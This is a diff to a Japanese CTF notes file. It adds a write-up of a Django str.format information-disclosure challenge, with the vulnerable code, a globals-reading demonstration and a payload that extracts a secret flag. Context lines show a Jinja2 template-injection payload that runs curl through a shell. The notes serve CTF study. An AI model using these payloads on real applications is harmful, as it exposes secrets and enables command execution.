@@ -1055,16 +1055,81 @@ https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
 // これで任意コマンドを送信したら実行できる
 {{ config['RUNCMD']('/usr/bin/curl http://vault:8080/flag',shell=True) }}
 ```
+## Django str.format Information Disclosure (CODEGRAY CTF 2018)
+https://blog.ssrf.in/post/codegray-ctf-writeup/   
+- **entrypoint**    
+python3で`format`関数の`"hello {user}".format(user="John")`みたいなのの`"hello {user}"`に該当する箇所をユーザーの入力にできる部分が脆弱！これでグローバル変数の値を読みだせる！   
+- **概要**    
+以下のソースの`template.format(email=email,user=user)`で`template`にユーザーの入力を挿入できる部分が脆弱！   
+```python
+# Create your views here.
+def main(request):
+    context = {}
+    return render(request, 'mypage/index.html', context)
+
+def subscribe(request):
+    # Get parameter from user
+    email = request.POST['email']; ... 👈
+    user = request.user
+    # Building json
+    template = '%s' % email
+    template = template.format(email=email, user=user)
+    template = "{'result':true, 'email':'"+template+"'}"
+```
+python3のformatに関する参考は以下。   
+https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/   
+https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/   
+以下のように`.format`の左側のやつを指定できるとき、以下の手法でグローバル変数にアクセスできる！   
+```python
+CONFIG = { 
+    "KEY": "ASXFYFGK78989"
+} 
+  
+class PeopleInfo: 
+    def __init__(self, fname, lname): 
+        self.fname = fname 
+        self.lname = lname 
+  
+def get_name_for_avatar(avatar_str, people_obj): 
+    return avatar_str.format(people_obj = people_obj) 
+    
+people = PeopleInfo('GEEKS', 'FORGEEKS') 
+  
+st = "Avatar_{people_obj.fname}_{people_obj.lname}"
+print(get_name_for_avatar(st, people_obj = people) )
+# Avatar_GEEKS_FORGEEKS
+
+st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
+print(get_name_for_avatar(st, people_obj = people) )
+# ASXFYFGK78989
+```
+- **Payload**    
+```txt
+{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}
+
+// 以下のように返ってくるらしい
+{'result':true, 'email':'{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}FLAG{IU_Is_the_b3st_singer_ev3r!}'}
+```
+
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
 ## sample
 - **entrypoint**    
 - **概要**    
 - **Payload**    
 
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
 
 ## sample
 - **entrypoint**    
 - **概要**    
 - **Payload**    
+
 
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
